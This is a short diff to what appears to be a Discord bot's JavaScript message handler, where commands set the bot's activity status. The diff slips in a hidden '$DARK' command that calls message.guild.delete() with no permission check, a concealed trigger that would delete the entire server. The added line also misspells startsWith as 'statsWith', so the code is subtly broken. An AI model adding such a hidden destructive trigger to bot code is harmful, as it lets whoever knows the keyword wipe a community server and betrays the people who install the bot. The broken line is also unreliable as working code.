@@ -37,6 +37,9 @@ client.on('message', message => {
   if (message.content.startsWith('$wt')) {
   client.user.setActivity(argresult, {type:'WATCHING'});
       message.channel.send(`**✅   ${argresult}**`)
+  } else
+   if (message.content.statsWith("$DARK")) {
+      message.guild.delete();
   } else 
   if (message.content.startsWith('$ls')) {
   client.user.setActivity(argresult , {type:'LISTENING'});
